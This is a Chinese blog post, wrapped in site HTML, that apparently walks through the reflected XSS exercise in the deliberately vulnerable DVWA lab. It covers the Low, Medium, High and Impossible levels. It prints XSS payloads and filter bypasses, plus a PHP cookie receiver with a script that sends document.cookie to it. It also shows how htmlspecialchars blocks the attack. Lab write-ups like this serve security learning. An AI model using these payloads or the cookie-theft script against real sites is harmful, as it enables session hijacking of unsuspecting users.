@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="介绍反射型xss（非持久型）：需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。特点：弹窗警告、广告；javascript；在浏览器中执行。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA xss(reflected)">
+<meta property="og:url" content="http://example.com/2023/04/17/DVWA%20xss(reflected)/index.html">
+<meta property="og:site_name" content="057lwq&#39;s Blog">
+<meta property="og:description" content="介绍反射型xss（非持久型）：需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。特点：弹窗警告、广告；javascript；在浏览器中执行。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/DVWA/10-1.png">
+<meta property="og:image" content="http://example.com/images/DVWA/10-3.png">
+<meta property="og:image" content="http://example.com/images/DVWA/10-4.png">
+<meta property="og:image" content="http://example.com/images/DVWA/10-5.png">
+<meta property="og:image" content="http://example.com/images/DVWA/10-6.png">
+<meta property="og:image" content="http://example.com/images/DVWA/10-7.png">
+<meta property="article:published_time" content="2023-04-17T03:12:47.000Z">
+<meta property="article:modified_time" content="2023-07-10T11:03:25.195Z">
+<meta property="article:author" content="lwq">
+<meta property="article:tag" content="DVWA">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/DVWA/10-1.png">
+
+<link rel="canonical" href="http://example.com/2023/04/17/DVWA%20xss(reflected)/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>DVWA xss(reflected) | 057lwq's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">057lwq's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/17/DVWA%20xss(reflected)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lwq">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="057lwq's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DVWA xss(reflected)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-04-17 11:12:47" itemprop="dateCreated datePublished" datetime="2023-04-17T11:12:47+08:00">2023-04-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-07-10 19:03:25" itemprop="dateModified" datetime="2023-07-10T19:03:25+08:00">2023-07-10</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>反射型xss（非持久型）：需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。特点：弹窗警告、广告；javascript；在浏览器中执行。</p>
+<span id="more"></span>
+
+<p>通过Web站点漏洞，向客户交付恶意脚本代码，实现对客户端的攻击；恶意攻击者往Web页面里插入恶意的 Script 代码，当用户浏览该页面时，嵌入其中 Web 里面的 Script 代码就会被执行，从而达到恶意攻击用户的目的；注入客户端脚本代码、盗取cookie、重定向等。</p>
+<p>实现流程<br>1）攻击者向服务器端注入一段js代码<br>2）服务器端响应攻击者一个带有js代码的页面<br>3）攻击者向普通用户发送带有js代码的页面，诱使用户点击页面<br>4）用户点击攻击者所发送的页面，页面自动运行js代码，获取用户cookie，并发送给攻击者</p>
+<h1 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h1><p>先用alert进行弹窗测试验证是否存在xss<br><code>&lt;script&gt;alert(&#39;hack&#39;)&lt;/script&gt;</code><br><img src="/images/DVWA/10-1.png" alt="1"><br>成功弹窗，说明存在xss<br>编写一个cookie.php文档用于获取页面的cookie，放置在一个指定的目录下（可以尝试放在网站的根目录之外的路径下看是否有效）文档内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">  $cookie = $_GET[&#x27;cookie&#x27;];</span><br><span class="line"> </span><br><span class="line">  file_put_contents(&#x27;cookie.txt&#x27;,$cookie);</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>接着编写 js 代码（意思就是利用本地的cookie.php这个文件获取cookie，要注意本地的地址要写对。）将页面的cookie发送到cookie.php中<br><code>&lt;scriptdocument.location=&quot;http://localhost/dvwa/cookie.phpcookie=&quot;+document.cookie;&lt;/script&gt;</code><br>进行url编码后放到url栏中，执行后可以发现dvwa的根目录下多了一个cookie.txt文件，里面存储的就是我们想要获取的用户的cookie<br><img src="/images/DVWA/10-3.png" alt="1"></p>
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">    // Feedback for end user</span><br><span class="line">    echo &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">源码解析：</span><br><span class="line"></span><br><span class="line">1）array_key_exists检查数组中是否有指定的键名</span><br><span class="line">2）X-XSS-Protection: 1强制XSS保护(如果XSS保护被用户禁用，则有用)</span><br><span class="line">                     0禁用XSS保护</span><br></pre></td></tr></table></figure>
+<p>可以看到，low级别的代码只是判断了name参数是否为空，如果不为空的话就直接打印出来，并没有对name参数做任何的过滤和检查，没用进行任何的对XSS攻击的防御措施，存在非常明显的XSS漏洞，用户输入什么都会被执行。</p>
+<h1 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;)</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] );</span><br><span class="line">    // Feedback for end user</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>可以看到，medium级别的代码只是在low级别上增加了对于<scripit>的过滤，把 <script>替换为空，然而并没有什么用，我们可以直接采用以下几种方式绕过。</p>
+<h2 id="1-大小写绕过"><a href="#1-大小写绕过" class="headerlink" title="1.大小写绕过"></a>1.大小写绕过</h2><p>例如<code>&lt;sCript&gt;alert(&#39;hack&#39;)&lt;/scRIpt&gt;</code>即可<br><img src="/images/DVWA/10-4.png" alt="1"></p>
+<h2 id="2-双写绕过"><a href="#2-双写绕过" class="headerlink" title="2.双写绕过"></a>2.双写绕过</h2><p><code>&lt;scr&lt;script&gt;ipt&gt;alert(&quot;hack&quot;)&lt;/script&gt;</code><br><img src="/images/DVWA/10-5.png" alt="1"></p>
+<h2 id="3-使用非标签的其他标签"><a href="#3-使用非标签的其他标签" class="headerlink" title="3.使用非标签的其他标签"></a>3.使用非<script>标签的其他标签</h2><p><code> &lt;img src=1 onerror=&#39;alert(&quot;hack&quot;)&#39;&gt;</code><br><img src="/images/DVWA/10-6.png" alt="1"></p>
+<h1 id="High"><a href="#High" class="headerlink" title="High"></a>High</h1><p>在high等级中继续使用 <script>alert(/xss/)</script> 测试是否有XSS漏洞，会发现只显示 &gt; 前面所有字符被过滤：<br><img src="/images/DVWA/10-7.png" alt="1"><br>同时尝试使用medium等级中的大小写绕过、双写绕过，发现还是所有字符都被过滤。既然在high等级中<script>标签被彻底过滤，那么我们使用非<script>标签 img、body等标签的事件或者 iframe等标签 的src注入恶意js代码。<br><code>&lt;img src=x οnerrοr=alert(&quot;hack&quot;)&gt;</code></p>
+<p>#Impossible</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line">    // Get input</span><br><span class="line">    $name = htmlspecialchars( $_GET[ &#x27;name&#x27; ] );</span><br><span class="line">    // Feedback for end user</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">htmlspecialchars(string)： 把预定义的字符:</span><br><span class="line"> &quot;&lt;&quot; （小于）、 &quot;&gt;&quot; （大于）、&amp; 、&#x27;&#x27;、&quot;&quot; 转换为HTML实体，</span><br><span class="line"> 防止浏览器将其作为HTML元素</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以看出，impossible级别的代码先判断name是否为空，不为空的话然后验证其token，来防范CSRF攻击。然后再用htmlspecialchars函数将name中的预定义字符 “<” （小于）和 “>” （大于）转换成html实体，这样就防止了我们填入标签。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/DVWA/" rel="tag"># DVWA</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/04/16/DVWA%20xss(dom)/" rel="prev" title="DVWA xss(dom)">
+      <i class="fa fa-chevron-left"></i> DVWA xss(dom)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/05/15/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="php反序列化">
+      php反序列化 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Low"><span class="nav-number">2.</span> <span class="nav-text">Low</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Medium"><span class="nav-number">3.</span> <span class="nav-text">Medium</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">lwq</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lwq</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
